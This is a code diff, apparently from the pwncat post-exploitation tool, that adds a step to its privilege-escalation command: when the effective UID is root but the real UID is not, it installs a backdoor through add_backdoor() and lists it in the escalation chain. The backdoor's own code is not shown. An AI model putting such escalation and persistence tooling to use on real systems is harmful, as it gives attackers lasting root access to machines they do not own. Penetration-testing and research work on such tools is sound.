@@ -610,10 +610,32 @@ class PtyHandler:
         else:
             try:
                 chain = self.privesc.escalate(args.user, args.max_depth)
+
+                ident = self.id
+                backdoor = False
+                if ident["euid"]["id"] == 0 and ident["uid"]["id"] != 0:
+                    util.progress(
+                        "EUID != UID. installing backdoor to complete privesc"
+                    )
+                    try:
+                        self.privesc.add_backdoor()
+                        backdoor = True
+                    except privesc.PrivescError as exc:
+                        util.warn(f"backdoor installation failed: {exc}")
+
                 util.success("privilege escalation succeeded using:")
                 for i, (technique, _) in enumerate(chain):
                     arrow = f"{Fore.YELLOW}\u2ba1{Fore.RESET} "
                     print(f"{(i+1)*' '}{arrow}{technique}")
+
+                if backdoor:
+                    print(
+                        (
+                            f"{(len(chain)+1)*' '}{arrow}"
+                            f"{Fore.YELLOW}pwncat{Fore.RESET} backdoor"
+                        )
+                    )
+
                 self.reset()
                 self.do_back([])
             except privesc.PrivescError as exc:
